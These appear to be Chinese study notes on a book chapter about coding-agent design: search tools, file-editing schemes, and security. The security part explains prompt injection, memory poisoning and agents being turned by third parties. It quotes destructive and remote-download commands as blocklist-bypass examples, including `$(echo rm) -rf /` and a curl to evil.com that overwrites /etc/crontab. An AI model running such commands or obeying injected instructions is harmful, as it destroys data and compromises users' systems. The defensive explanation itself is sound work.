即时语法反馈是「反馈越快越好、越结构化越好」这条 Harness 原则最直白的一次落地。它的价值可以量化理解：一个语法错误如果在写入时就被发现，修复成本是下一轮改一个括号；如果等到跑完整个测试套件才发现，修复成本多了跑测试的等待时间、定位到是哪个文件哪一行、以及前面几步的推理上下文。原文用 IDE 画红线作类比非常贴切，IDE 之所以画红线，就是因为它把检查器放到了编辑动作的同一时刻，而不是等到编译。Coding Agent 要做的是同一件事：把 linter 挂到文件写入这个动作上。

这五个技巧彼此是有耦合的。「即时语法反馈」和「环境信息动态注入」都依赖 Agent 状态栏这个机制（把小块信息追加在上下文尾部）；「持久化终端会话」和「上下文精细化管理」都依赖长输出截断与持久化机制（因为持久会话可能积累大量输出，必须截断后落盘）；「并行工具调用」和「级联中止」依赖工具定义里的并发声明。原文最后说它们「不是孤立的优化点，而是相互配合的设计决策」，说的就是这个。

这一节的易混点集中在四对概念上。流式执行（streaming）与并行执行（parallel）常被混为一谈：流式是不等后续工具调用生成完、第一个参数校验通过就开跑，解决的是生成与执行的重叠；并行是多个彼此独立的调用同时跑，解决的是执行之间的排队。两者可以同时用，但机制不同，流式靠的是按参数边界解析流式输出，并行靠的是工具定义里的并发声明加调度器。长输出截断与按行号范围读取都为了省上下文，但作用对象不同：前者作用于命令输出（保留头尾、中间省略、全量落盘到临时文件）；后者作用于文件内容（用 offset/limit 只取需要的行段）。共同点是都遵循「需要时再看全量」的思路，而不是一开始就把全量塞进去。Agent 状态栏与系统提示词的内容性质也不同：系统提示词是不随会话变化的稳定内容（角色、规则），放最前以最大化 KV Cache 命中；Agent 状态栏是每次推理都在变的内容（cwd、分支、最近提交、变更概览），必须追加在上下文末尾。把动态内容写进静态前缀会毁掉缓存；反过来，把规则写进状态栏则会让它每轮重算。持久化终端会话与隔离终端则是默认与例外的关系：前者是默认模式，为了让 `cd`、虚拟环境、环境变量、后台服务这些状态在命令之间连续；后者是为了并行任务互不干扰而保留的能力。

五个技巧（并行与流式、上下文管理、环境感知、状态持久化、即时反馈）都在做同一件事：消除不必要的等待与不必要的上下文，让 Agent 像经验丰富的开发者那样流畅工作。

### 5.1.7 Coding Agent 中的搜索工具

在庞大的代码库中定位相关代码，是 Coding Agent 工作的起点，原书开篇就把这句话摆在最前面。图 5-3 把几类互补的搜索工具摆在一起对比，落点是同一个意思，成熟的 Coding Agent 得会按任务性质挑检索方式。

图 5-3（原文插图，题为「Coding Agent 搜索工具对比」）用四栏并列的方式对比了四类搜索方式，每栏给出查询示例、返回结果和一句话定位：

| 搜索方式 | 查询示例 | 返回结果示例 | 图中的一句话定位 |
| --- | --- | --- | --- |
| 正则内容匹配（grep） | `rg "def handle_.*" --type py` | `src/api.py:42: def handle_request(..)`、`src/api.py:89: def handle_timeout(..)`、`src/ws.py:15: def handle_connect(..)` | 精确文本 → 所有出现位置 |
| 文件名匹配（glob） | `glob: **/test_*.py` | `tests/test_api.py`、`tests/test_auth.py`、`tests/unit/test_parser.py` | 路径模式 → 不读取文件内容 |
| 语义代码搜索 | 「处理用户输入验证」 | `[0.91] src/validators.py:validate_input()`、`[0.87] src/forms.py:sanitize_fields()`、`[0.82] src/api.py:check_params()` | 自然语言 → 向量 + BM25 混合 |
| 符号定义/引用 | `find_references: UserService` | 定义：`src/services/user.py:12`；引用：`src/api/routes.py:34 (import)`、`src/api/routes.py:56 (调用)`、`tests/test_user.py:8 (测试)` | AST 级 → 消除同名歧义 |

先看最传统的那一类。正则表达式内容匹配（grep / ripgrep）逐行扫描文件内容做模式匹配，当 Agent 已经知道要查找的具体文本（函数名、变量名、错误消息）时，它能又快又准地把所有出现位置列出来。原文顺带解释了正则的定位：用特殊符号描述文本模式的语法，`def handle.*` 就匹配所有以 `handle` 开头的函数定义。这套表达能力可以捕捉复杂模式，除了字面文本，还能搜符合特定结构的代码片段。在实际使用中，原文还要求它支持文件类型过滤（只搜 Python 文件）和路径模式过滤（排除测试目录）来减少噪音。它的根本局限同样明确：只能找到字面上匹配的内容，读不懂语义。搜「用户认证」的时候，那个没有「认证」二字、却确实在处理登录逻辑的函数，grep 是看不见的。

文件名模式匹配（glob）走的是另一条路，不看文件内容，只在文件系统的路径结构中查找符合模式的文件。`**/*.test.ts` 递归找出所有 TypeScript 测试文件，`src/components/**/Button.tsx` 在 components 下任意深度查找 `Button.tsx`。因为不需要打开和读取文件，它的速度比内容搜索快得多，原文把它列为探索项目结构的第一步：先快速扫一遍整个文件系统，把项目的组织框架建立起来。

语义代码搜索与前两种精确匹配不一样，它试图理解查询和代码的「意义」。原文指出这里要解决两个关键问题。一个是结构感知的分块：代码有严格的语法结构，应该按函数、类、方法等完整语义单元切分，而不是按固定字符数盲目切割。另一个是混合检索（这套技术栈第三章有详细介绍）：向量嵌入（稠密嵌入）擅长找到语义相似但用词不同的代码，搜「验证用户身份」能捞到名叫 `check_credentials` 的函数；关键词匹配擅长精确匹配函数名和变量名。两者并行执行，再由重排序模型（reranker，用交叉编码器对候选结果做精细的相关性排序）合并排序，互补覆盖。这种搜索特别适合探索性任务，比如在不熟悉的代码库中寻找「与数据库交互」或「处理用户输入验证」相关的代码。

但它该不该常驻，业界有明显的路线之争。以 Claude Code 为代表的终端型 Agent 刻意不建嵌入索引，纯靠 agentic 的 grep + glob 现场检索，原文给了两点理由：既不必维护一份随代码演化而不断陈旧的索引，也省掉了一整套索引基础设施。Cursor 这类 IDE 型工具早期走的是相反路线，愿意为跨文件的语义召回付出建索引的成本，靠嵌入索引在大型代码库中快速找到语义相关但用词不同的片段。原文补了一句现状：目前 Cursor 等 IDE 也改用 grep + glob 现场检索了。

符号级定义与引用查找对应的是 IDE 里「跳转到定义」「查找所有引用」那套能力，它能区分同名符号的定义和调用，知道 `authenticate` 在第 42 行是函数定义、在第 189 行是调用，而文本搜索只能把所有包含这个字符串的行都翻出来。原文在这里给了一个明确的事实判断：目前主流 coding agent 并未采用这一方法。

原文最后给的是组合策略。这四种方式构成一个互补的工具箱，实践中往往组合使用：先用语义搜索找到相关模块，再用正则匹配精确定位具体代码行，最后通过符号搜索追踪调用链。原文的概括是「从粗到细、从语义到语法」的渐进式策略。

把四种方式排到一条「精确度」轴线上会更好记。glob 最粗，只看路径，连文件都不打开；grep 细一层，看内容，但要求字面匹配；语义搜索最宽，不要求字面匹配，代价是结果带相似度分数、有噪声；符号查找最准，基于 AST，能区分定义与引用，没有同名歧义。原文那句组合策略正是沿着这条轴走的：先用最省钱的方式把范围缩到几个模块，再用精确的方式定位到具体行。

glob 为什么坐在流程起点上？因为它回答的是「项目长什么样」这个结构性问题，跟「某段逻辑在哪」的定位问题是两回事。一个新来的 Agent（或者人）打开陌生仓库，合理的动作是先用它扫出目录骨架，看看有哪些模块、测试放哪儿、配置放哪儿，再决定往哪里 grep。原文把 glob 放在这条流程的开头，跟 5.1.3 讲的项目文档化是同一个思路：先建立认知框架，再动手。

结构感知的分块之所以是语义搜索的前提，在于语义搜索的第一步是把代码切块、为每块算一个向量。按固定字符数切（比如每 500 字符一段），一个函数很可能从中间被切断，前半段和后半段各成一个块，一个块里只有函数签名和注释，另一个块里只有循环体。算出来的向量既代表不了这个函数，检索出来也没法用，你拿到的是半截代码。按函数、类、方法切分，才能保证每个块都是语义完整、可以独立理解的单元。这是「代码不是普通文本」的一个直接体现。

至于混合检索为什么要向量加关键词两条腿，是因为两者的失效模式恰好互补。向量检索擅长意思相近但用词不同，在精确的标识符匹配上却表现很差：用户明确要找 `validate_input` 这个函数名，它可能给你一堆名字相近但不相干的函数。BM25 这类关键词检索正好反过来，精确匹配强，语义泛化弱。两条路并行跑一遍再合并排序，就同时覆盖了「我记得意思但忘了名字」和「我记得名字」两种查询。reranker 只用在最后一步是有原因的，它要在候选集上做一次更贵但更准的两两相关性打分（交叉编码器得把 query 和每个候选拼在一起过一遍模型），所以拿它重排，不拿它全库检索。

索引之争说白了是预计算与现算的权衡。建嵌入索引属于预计算，花一次性的建索引成本，换后续查询的快和语义召回的高，代价是索引会陈旧：代码天天在改，索引得跟着重建，否则会指向已经删掉的代码，或者漏掉新代码。grep + glob 属于现算，每次都在当前真实的文件系统上搜，永远和代码同步，不需要任何基础设施，代价是每次都要现扫，而且没有语义泛化能力。原文给的事实，也就是 Cursor 从索引路线转向 grep + glob 现场检索，说明在模型能力足够强之后，「让 Agent 自己多搜几轮」往往比「维护一套索引基础设施」更划算。agentic 检索允许模型看到结果后调整关键词再搜，多轮交互把语义泛化的缺口补上了。这跟 5.2.1 那句「模型足够强时，脚手架可以更薄」是同一个规律。

「符号级查找目前主流 coding agent 并未采用」这个事实值得多看一眼。图 5-3 明明把它画成四类之一，最后一段的组合策略里也有它，原文却说主流并未采用。比较合理的理解是：它的能力上限最高，基于 AST，能区分定义和引用，能追踪调用链；实现成本也最高，要为每种语言建解析器、维护符号表、处理宏和不完整代码，而且对语言后端的依赖很重，一个仓库里可能混着五种语言。grep 对任何文本都能用，后端成本是零。在用最少的语言后端覆盖最多仓库这个工程约束下，符号查找暂时还是 IDE 的强项，不是 Agent 的默认配置。原文的措辞是「目前」，暗示这个判断会随基础设施成熟而变化。

这里有几组东西容易混，一并说清。

grep 与语义搜索的差别在匹配层次：grep 是字面匹配，要求查询词和代码里的字符串一致，或者符合正则描述的结构；语义搜索是意义匹配，不要求字面一致。搜「用户认证」时 grep 找不到 `check_credentials`，语义搜索能。反过来，明确要找 `validate_input` 这个标识符时，grep 一击即中，语义搜索会回你一堆近似项。

glob 与 grep 的差别在匹配对象：glob 匹配路径（`**/test_*.py`），不读文件内容，快；grep 匹配内容，要逐行扫描，慢但能定位到具体行。图 5-3 里 glob 那栏的定位句「路径模式 → 不读取文件内容」就是这对区别的浓缩。

语义搜索与符号查找都能对付「同名」，机制完全不同。语义搜索靠相似度排序把最相关的排前面，同名符号对它是干扰项，它分不清第 42 行的 `authenticate` 和第 189 行的 `authenticate` 哪个是定义；符号查找靠语法分析从根本上区分定义与引用。前者是概率性的，后者是确定性的。

向量嵌入与重排序模型（reranker）都基于语义，用法不同。嵌入是双编码器，query 和文档分别编码成向量、算余弦相似度，快，可以预计算全库，用在召回那一步；reranker 是交叉编码器，query 和候选拼在一起过模型、输出相关性分数，慢但准，用来重排几十个候选。原文说的「并行执行后通过重排序模型合并排序」，讲的就是这个两阶段结构。

四条线各占「精确度」轴线的一段：glob 看路径、grep 看字面、语义搜索看意义、符号查找看语法。实践里的用法是沿「从粗到细、从语义到语法」把它们串起来。

## 5.1.8 Coding Agent 中的文件编辑工具

文件编辑的难点不在操作本身，难的是怎么让 LLM 用高效又可靠的方式告诉系统「改哪里、怎么改」。图 5-4 对比了五种文件编辑方案，展示的是人类语言表达与机器精确执行之间的根本张力。

图 5-4（原文插图，题为「五种文件编辑方案对比」）给出五种方案的示例、机制、优势与劣势，并在图底部单独标出「实际采用情况」：

| 方案 | 图中的示例 | 机制 | 图中的优势 | 图中的劣势 |
| --- | --- | --- | --- | --- |
| Diff + Apply Model | `- def foo(x):` / `- return x` / `+ def foo(x, y=0):` / `+ return x + y` → 小模型定位并应用 | LLM 输出 diff 描述，交由小模型定位并应用 | 关注点分离 | 微小偏差致错位 |
| Old String → New String | `old: "def foo(x):\n return x"`、`new: "def foo(x, y=0):\n return x + y"` → 字符串精确匹配替换 | 字符串精确匹配替换 | 可预测、无歧义 | 大段删除需全输出 |
| 行号定位 | 删除行 42-43，插入 `def foo(x, y=0):` / `return x + y` → 行号精确指定范围 | 行号精确指定范围 | 大段操作高效 | 长文件行号易错 |
| 类 Vim 命令 | `42G`（跳转 42 行）、`cw`（替换单词）、`dd`（删除行）、`yy/p`（复制/粘贴）→ 丰富的编辑语义 | 丰富的编辑语义 | 移动/重组高效 | 弱模型出错多 |
| 首尾匹配 | `start: "def foo(x):"`、`end: " return x"`、`new: "def foo(x, y=0):\n return x + y"` → 只需边界即可定位 | 只需边界即可定位 | 大段删除免全输出 | 需边界组合唯一 |

图底部给的「实际采用情况」是：Old→New 由 Claude Code 采用；行号定位用于 IDE 深度集成场景；Diff + Apply 由 Cursor 采用；首尾匹配用于部分定制方案；Vim 命令属于实验性方案。

差异描述 + Apply Model 这一路里，模型不直接指定如何编辑文件，而是生成一份变更描述。这份描述可以是类似 `git diff` 的差异文本（`git diff` 命令输出的那种「删了哪几行、加了哪几行」的格式），也可以是带省略标记的代码骨架，用「此处保持不变」之类的注释跳过未修改的部分。描述随后交给专门的「应用模型」（Apply Model），通常是另一个更小、更快的 LLM，由它负责与原文件合并、产出完整的新文件。这种职责分离让主模型专注高层代码逻辑、应用模型专注底层文本操作。原文也点出朴素实现的脆弱性出在合并环节：变更描述与文件实际代码有微小出入时需要判断是否同一位置，存在多个相似代码片段时可能合并到错误的地方。这条路线的结局原文也交代了：Cursor 是它的代表，但近期由于基础模型能力的提升，也不再使用这条路线了。

旧字符串到新字符串（Old String → New String）是 Claude Code、Codex 和今天 Cursor 采用的方案。模型提供 old string（要被替换的原文）和 new string（替换后的新文本），框架执行简单的字符串查找替换。原文给的优势是可预测性和透明性：old string 在文件中存在且唯一则成功，否则失败，中间不存在模棱两可的余地。代价有两条：删除大段代码时需完整输出所有原始内容，一个字符的偏差就会匹配失败；同一代码出现多次时需提供更长的上下文来消除歧义。

行号定位（Old Line Numbers → New String）让模型指定「删除第 X 到 Y 行，插入新内容」。原文强调前置条件：只要读文件工具提供了行号信息，模型就可以精确地看到欲删除内容的行号。优势是行号精确无歧义，大段删除只需首尾行号两个数字。问题在于每次编辑后后续行号都会变化，而模型一次思考可能会输出多处编辑，此时需要像 diff 一样，让模型在多次编辑中都使用初始行号来定位，以免出现混淆。

类 Vim 编辑命令借鉴 Vim 编辑器的命令体系，支持复制、剪切、粘贴等丰富操作，对重组代码（将函数从一处移动到另一处）非常高效。代价有两条：命令语法的学习负担较大，最强的模型能较好使用，较小的模型错误率则会明显上升；这种方法对模型一次思考输出多个编辑命令并不友好，因为 Vim 每次编辑后文件内容和行号都会发生改变，模型很难提前计算修改后的行号。

原文在这后面还有一层更深层的思考：Vim 等代码编辑器是为人类设计的。人类需要不断看到当前的状态，并规划下一步的简单操作，比如写一行代码，或者删除几行代码。今天模型的工作模式是经过较长时间的思考，再批量进行较为复杂的操作，比如写几百行代码。

字符串首尾匹配（Old String Start + End → New String）可以看作旧字符串替换方案的改进。模型不需要输出完整的 old string，只需提供要删除内容的开头几行和结尾几行，中间部分可省略。框架通过匹配这个开头和结尾来定位替换区域，只要这对「首尾」组合在文件中唯一就能准确定位。原文的总结是它综合了文本替换的可靠性和行号方案的效率：处理大段代码删除时无需输出数百行原始代码，只需展示边界即可；同时因为它仍然基于内容匹配，不依赖抽象行号，模型犯错的风险相对较低。

这五种方案其实在回答同一个问题：「改哪里」这个信息，用什么形式表达最不容易出错、又最省 token。它们代表两条不同的思路。基于内容定位的一类（Old→New、首尾匹配、Diff+Apply）用「原文长什么样」来指出位置，优点是可靠，内容对不上就报错，不会改错地方，缺点是要输出内容，大段删除时很贵。基于坐标定位的一类（行号、Vim 命令）用「第几行」来指出位置，优点是省，大段删除只要两个数字，缺点是脆弱，行号会因为别处的编辑而漂移，模型得自己在脑子里维护一份「编辑后的行号表」。首尾匹配被原文称为综合了可靠性和效率，正因为它站在两条路的交叉点上：用内容（首尾几行）来定位，但只输出边界而不用输出全部。

Diff + Apply 的失败模式特别值得记。它的失败不在「模型写错了 diff」，而在「应用模型把 diff 贴错了地方」。原文那句话说得准：「存在多个相似代码片段时可能合并到错误的地方」。这在真实代码里非常常见，十个文件里都有 `return None`，或者同一个类里有多个相似的 `if` 分支。这类错误恰恰是最危险的，因为它不会报错，文件被改成了合法但错误的样子。所以原文虽然把它列为一种方案，同时也交代了它的结局：Cursor 因为基础模型能力提升，已经不再走这条路了。这件事本身是个信号，当主模型足够强、能直接输出精确的 old string 时，引入一个额外模型带来的不确定性反而成了负担。

Old→New 那条「一个字符的偏差就会匹配失败」，表面上看是缺点，原文却把它归为可预测性和透明性。理由在文件编辑这个场景里站得住：失败远好于改错。old string 对不上，工具直接报错，模型下一轮可以重新读文件再试；换成一个「宽容」的匹配（模糊匹配、允许偏差），就可能悄悄改在错误的位置，产出语法正确但语义错误的代码。用一个温和的比喻，Old→New 是要求精确对号的锁，钥匙对不上就开不了门，但你绝不会走进错误的房间。

「同一代码出现多次时需提供更长的上下文来消除歧义」这条代价，和首尾匹配的「需边界组合唯一」是同一个问题的两种缓解办法。前者是扩大 old string，多带几行上下文，直到这段文本在全文件里唯一；后者是只给首尾，首尾的组合唯一即可，中间不用给。两种办法都在解决「唯一性」这个约束，只是用不同的方式买唯一性：一个多花 token，一个少花 token。

类 Vim 命令后面那段更深层的思考，是这一节里最有价值的一句。它超出了「五种方案的优劣」这个技术层面，触及编辑模型背后的假设。Vim 的整套设计建立在两个前提上：操作者是循环式工作的，看一眼状态、做一个微操作、再看一眼，操作之间不断观察反馈；操作者对文本状态有持续的、可更新的心智模型，知道现在光标在哪、刚做了什么。而今天 LLM 的工作模式恰好相反，它并不「看着」文件编辑，它一次性规划一批操作然后全部发出，在它发出第二个编辑命令时，它并不真的知道第一个编辑命令执行后文件变成了什么样。所以 Vim 的命令体系，尤其是 `42G` 这种绝对行号跳转，对模型来说是在要求一件它做不到的事：预测自己动作的后果。原文说的「模型很难提前计算修改后的行号」正是这个意思。

把这条洞察推一步，就能理解为什么首尾匹配和 Old→New 这类内容定位方案最终胜出。它们不要求模型维护一个可更新的位置模型，只要求模型抄准确要改的那段原文。抄写是模型擅长的事，尤其在有了行号标注和精确原文的情况下；维护行号偏移是它不擅长的。原文 5.1.6 里「返回内容时附加行号标注」之所以重要，是因为它在读取侧给了模型精确坐标，而编辑侧真正依赖的还是内容匹配。这个分工很聪明：用行号让模型看懂文件，用内容让模型改对文件。

剩下几组容易混的概念。

Old String → New String 与首尾匹配都基于内容匹配，区别在于要输出多少原文：Old→New 要输出完整的被替换内容（大段删除时很贵），首尾匹配只输出开头几行和结尾几行（中间省略），靠「首尾组合唯一」来定位。首尾匹配可以看作 Old→New 的省 token 版本。

行号定位与类 Vim 命令都基于位置。行号定位只做一件事，「删除第 X 到 Y 行，插入新内容」，语义极简；类 Vim 命令提供了复制、剪切、粘贴、跳转等一整套操作，表达力更强，学习成本更高，错误率也更高。原文对两者的评价不同：行号定位的劣势是「长文件行号易错」，属准确性问题；Vim 的劣势是「弱模型出错多」，属能力门槛问题。

应用模型（Apply Model）与主模型的分工也要分清。在 Diff + Apply 方案里，主模型负责生成变更描述（高层代码逻辑），应用模型负责合并出完整新文件（底层文本操作）。这算不上多 Agent 协作，两者不在同一个任务循环里交互，只是一次职责切分，原文称其为「关注点分离」。

图 5-4 里 Diff + Apply 那一栏提到的变更描述有两种形态，也容易混。`git diff` 风格的差异文本是「删了哪几行、加了哪几行」；带省略标记的代码骨架是用「此处保持不变」之类的注释跳过未修改部分。两者都是「描述改动」而非「重写全文」，区别在描述的粒度。

文件编辑的真正难点是「改哪里」的表达方式。五种方案分「内容定位」（可靠但要抄原文）与「坐标定位」（省但要维护行号）两条路，而模型的批量编辑工作模式决定了内容定位更稳。

### 5.1.9 Coding Agent 的安全

原文先交代这一节的叙事线，把 Coding Agent 的安全防线收拢成一条完整的线索：先勾勒威胁模型，看哪些风险最致命；再讨论隔离兜底，也就是沙盒的网络出口、文件系统与资源限额；然后是执行期防御，命令的语义解析，以及让安全检查「隐形」的推测性执行（这一项原文正文没有展开，见本节末的勘误）；最后落到信任与忠诚，多方委托下 Agent 为谁效忠，以及动态生成软件为何需要把信任边界下移到数据层。原文还特别说明了适用范围：威胁模型、忠诚度与数据层信任边界这几块的讨论对所有 Agent 通用，沙盒与命令解析则是 Coding Agent 特有的补充内容。

> 依据：① 原书 5.1.9 开头（印刷 p.134）明确写「然后是执行期防御——命令的语义解析，以及让安全检查『隐形』的推测性执行」；② 全章检索「推测」只命中这一行，正文再无任何对应内容，属漏写而非移到别处；③ 对照同一句叙事线里的另一项「动态生成软件为何需要把信任边界下移到数据层」，它确实在 5.2.5 展开（印刷 p.157）——可见叙事线其余各项都兑现了，唯独这一项落空。宜删去该项或补上对应小节。

威胁模型是这一节的起点。原文先立危险前提：Coding Agent 拥有读写文件、执行命令、访问网络的权限，这意味着一旦被注入恶意指令就可能造成不可逆的损失。Simon Willison 把这种风险概括为著名的「致命三要素」：访问私有数据，Agent 能读取用户文件和密码管理器；暴露于不受信任内容，处理的邮件和网页可能包含恶意载荷；具备外部通信能力，能发送邮件和执行命令。

> ℹ️ 说明：这不是原书的错误——Simon Willison 确实提出过「致命三要素」（lethal trifecta）这一说法，指 LLM Agent 同时具备「访问私有数据」「暴露于不受信任内容」「对外通信能力」时会被滥用；该表述被社区广泛引用为 Agent 安全的基础威胁模型。原文把三项内容与这一提法对应起来是准确的。（来源：[Simon Willison on lethal-trifecta](https://simonwillison.net/tags/lethal-trifecta/)、[A "lethal trifecta" of conditions opens them to abuse](https://simonwillison.net/search/?q=llm+security&sort=date&tag=generative-ai&tag=prompt-injection)）

攻击路径要闭合才有杀伤力：恶意指令藏在不受信任的内容中进入 Agent，驱使它读取私有数据，再经对外通道传出。原文在三要素之上补了第四个维度，也就是持久记忆，并且做了严格限定：它算不上并列的第四个必要条件，更像攻击的放大器。攻击者可以把看似无害的偏见或恶意指令写入 Agent 的长期记忆，跨会话潜伏，等到合适的时机再触发，把一次性攻击升级为长期威胁。四点合起来对应四类边界：数据边界、输入信任边界、输出影响边界、跨会话边界。OpenClaw 这样的全权限本地 Agent 恰恰四者兼备，安全防护因此成为这类 Agent 必须正视的核心挑战。

这也能解释一个产品现象：闭源的商业 Agent，比如 Claude Cowork（Anthropic 面向知识工作的通用 Agent，复用 Claude Code 的架构，能读写本地文件、跨多个办公应用完成复杂任务），选择了保守的权限策略。原文的安全判断是，面对提示注入威胁，单靠输入过滤基本挡不住，重点不在识别所有攻击，而在让 Agent 即使被注入，也没有机会把危险动作真正执行出去。这正是第一章三层护栏的用武之地。

比其他 Agent 更麻烦的是，Coding Agent 有三点要特别当心，原文说明它们分别落在验证、执行和数据三个层面，与前两章的防御体系互为补充。命令语义解析排在头一个：Shell 命令的组合爆炸使关键字黑名单形同虚设，必须在语义层理解命令的真实效果。沙盒隔离与网络出口控制跟着来，代码执行是 Coding Agent 独有的攻击面，隔离级别与出口策略的工程选型下面展开。持久记忆的跨会话防线是本章在致命三要素之外强调的扩展项：写入长期记忆的内容需经过与外部内容同等的信任审查，避免恶意指令潜伏在 MEMORY.md 中长期生效。原文的收束态度是克制的，这些策略不能完全消除风险，但能缩小 Agent 的攻击面。

隔离兜底这一层，原文从三个维度给出工程选型。网络出口控制被它评价为最容易被忽视、却最关键的一项，做法是默认断网，按需通过白名单代理放行有限目的地，包括包管理源、文档站点、任务明确需要的 API。这里能接回威胁模型的第 3 条「具备外部通信能力」，网络出口控制正是它的执行面防御：提示注入哪怕成功了、恶意代码在沙盒内读到了敏感数据，没有出口照样传不出去。

文件系统隔离范围的做法是源码目录以只读方式挂载，Agent 通过编辑工具修改代码，生成的补丁经审查后落盘，或将副本挂入可写工作区；生成物和中间文件由单独的可写工作区目录承载；凭证类文件（`~/.ssh`、密钥、token）根本不挂载进沙盒。

资源限额与超时要求 CPU、内存、磁盘配额加超时，防的是死循环、fork 炸弹（通过疯狂自我复制进程拖垮系统）和无限写盘。原文还给了一个实践细节：超时和超限应向 Agent 返回结构化错误，比如「执行超过 120 秒被终止，最后输出如下⋯⋯」，而非静默杀死进程，让 Agent 有机会在下一轮修正策略。

安全校验该怎么做，原文接着第一章往下讲。第一章提到验证层应采用「基于理解而非匹配」的安全机制，Shell 命令安全校验是这条原则最具挑战性的应用场景。简单的关键字黑名单必然失败，因为 Shell 有组合爆炸：命令可以通过管道、子 shell、变量展开等方式绕过任何静态规则。原文举的例子是，`rm` 被禁了，攻击者可以用 `$(echo rm) -rf /` 绕过。

生产级 Harness 的做法是语义解析，理解每个命令的参数类型和消费规则，也就是哪些标志位会消费下一个参数，从而识别出「某个看似无害的标志位实际上会消费下一个参数从而隐藏危险载荷」这类攻击模式。原文给了两个具体攻击样例：`find / -name '*.log' -exec rm {} \;`，通过合法的 `find` 命令参数嵌入了 `rm` 删除操作；`curl -o /etc/crontab http://evil.com/payload`，看似下载文件实则覆盖系统定时任务。语义解析能识别出这些嵌套的危险操作，简单的命令黑名单无法捕获。这种基于理解而非匹配的安全机制，是 Harness 中「约束」功能的实现。

再往下是更微妙的一类问题。前面的安全机制防的是「命令被做坏」，还有一类叫委托方忠诚（principal loyalty）：Agent 到底站在谁那一边。根源在于模型在训练中形成了一条朴素的默认原则，「谁在跟我说话，我就尽力帮谁」。但真实的 Agent 常处在多方委托的处境里，它代表主人行事，打交道的却是利益相反的第三方。原文举的例子是替你砍价的 Agent，对面坐着的是交涉对手，不是「需要被帮助的用户」。这时候「谁说话帮谁」就是危险的默认设置：对手只要开口，就可能把 Agent 策反。

实测结果是一条两端都翻车的忠诚度光谱（原文脚注 2 说明：这条忠诚度光谱及守则的完整评测见 Li, Bojie and Noah Shi. *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents*. arXiv:2606.30383, 2026.）。一端是太老实，把主人的私密信息（比如「我方底价是 12000」）直接抖给对手，被反复施压几轮就缴械让步；另一端是太多疑，连主人正当的请求也一概拒绝，反而没法完成任务。原文强调难点所在：这两种失败是一根跷跷板，把泄密堵死往往就滑向过度拒绝，很难两全。

这对 Coding Agent 尤其贴切。仓库里读到的不可信内容、某个工具返回的输出、第三方 MCP 服务器发来的指令，都是试图让 Agent 倒戈的「对手」，提示注入本质上就是一次策反（原文指向第二、四章）。所以 Harness 层要明确限定「忠诚对象」：主人的指令优先级最高，一切来自外部交互方的内容都默认降格为「可参考、但不具备指令效力」的数据。

落到系统提示上，原文给出一套行之有效的忠诚度守则：保护主人的私密信息，甚至不泄露这些信息是否存在；拒绝时不逐条念出拒绝清单，那本身就在泄露；私下的底线不等于对外的立场；只执行主人明确、具体的指令；顶住重复施压。原文的总结句是，这本质上是在用 Harness 为模型补上一条它默认没有的立场：对主人绝对忠诚，对外部交互方保持审慎。

先讲清「致命三要素为什么是闭合的」，这是理解整套防御的关键。单独看每一条都不是灾难：Agent 能读私有数据，就像你自己能读自己的文件；Agent 能接触不受信任内容，就像你也会看邮件；Agent 能对外通信，就像你也能发邮件。危险发生在三者串成一条通路的时候：注入的指令从「不受信任内容」这一端进来，驱动 Agent 去「私有数据」那一端取料，再从「外部通信」那一端送出去。只要掐断这条通路上的任意一环，攻击就不成立。这也是原文那句判断的意思，与其想办法识别所有攻击，不如让 Agent 即使被注入，也没有机会把危险动作真正执行出去。工程上的含义是，你不需要一个能识别所有注入的完美分类器（这做不到），只需要在通路上放足够多的关卡。

网络出口控制是最划算的那道关卡，原因值得说明白：它是唯一一道「即使 Agent 完全被骗也依然有效」的防御。输入过滤依赖「我认得出这是攻击」，做不到；行为审查依赖「我看得出这个动作危险」，可以绕过；网络出口控制是在操作系统层面拒绝连接，不管 Agent 的主观意图是什么、不管恶意代码多聪明，没有出口就是发不出去。原文说它「最容易被忽视」，可能是因为沙盒配置时大家最先想到的是文件系统（怕删文件）和资源限额（怕跑飞），而忘了数据外泄这个方向。这个优先级值得记住：防读取重要，防外送同样重要。

只读挂载源码目录加单独可写工作区这个设计，同时服务了两个目标。安全目标是 Agent 不能直接改到用户的真实代码（尤其不能悄悄改），所有改动必须经过「补丁经审查后落盘」这道关。工程目标则更微妙：让修改变成可审查、可回滚、可丢弃的产物。原文给了两种实现（补丁审查落盘、副本挂进可写区），它们的安全性其实不同，前者能保证真实代码只被审查过的东西改，后者保证了改坏了可以整个丢掉重来。这跟 5.1.4 里「回退要可靠」是同一件事：Agent 在安全网内操作才能大胆试错。

凭证类文件「根本不挂载」这条原则值得单独强调。它的稳健性来自「不存在」比「访问被拒绝」更彻底：如果一个密钥文件被挂载进沙盒但设置了权限拒绝，那么任何一次权限配置失误、任何一次以 root 运行、任何一个内核漏洞都可能让它泄露；而如果这个文件根本不在沙盒的文件系统命名空间里，就不存在「绕过权限」这个概念。这是一个通用的安全思路：能通过「不存在」解决的，就不要用「不允许」解决。

资源限额要向 Agent 返回结构化错误而不是静默杀死，这正好是 5.1.5「反馈越结构化越好」在沙盒场景的复用。差别在于这一步的成本几乎为零，构造一条错误消息而已，收益却很实在：Agent 看到「执行超过 120 秒被终止」，下一轮可以换个更快的算法、缩小数据范围、或者加个分页；如果只是静默被杀，Agent 只会看到「没有输出」，很可能原样重试。

命令语义解析与关键字黑名单的对比，是「基于理解而非匹配」原则最漂亮的一个实例，值得把 `$(echo rm) -rf /` 拆开看。黑名单检查的是字符串里有没有 `rm`，而这条命令的字面文本里确实没有 `rm` 这个独立词，它出现在 `$(echo rm)` 里，是会被 shell 求值成 `rm` 的一段子表达式。所以黑名单要么漏掉不管 `$(...)`，要么就得把所有可能的构造方式都枚举出来（`$(echo rm)`、`$'r''m'`、`r\m`、`${x:-rm}`……），这是无底洞。语义解析换了个层次，它不问「这句话里有没有坏词」，而问「这条命令最终会执行什么」，需要理解参数语法（哪个标志位会消费下一个参数）、理解管道与子 shell 的组合语义、理解重定向的目标。原文给的两个例子正好对应这两类理解：`find ... -exec rm {} \;` 是参数消费规则问题，`-exec` 之后的参数会被当作命令执行；`curl -o /etc/crontab` 是副作用的真实目标问题，`-o` 指定的路径看起来只是输出位置，实际是系统定时任务文件。

忠诚度这一节是本章思想性最强的一段，也是唯一讨论「模型的对齐倾向本身构成安全风险」的地方。它的核心洞察是：模型训练出来的「乐于助人」是一种无差别的默认值，而真实的多方场景需要的是有差别的忠诚。默认值在大多数场景下是对的，用户就是主人，帮他没毛病；但在多方委托场景下就变成了漏洞，对手也是「跟我说话的人」，于是也被认为是该帮的人。

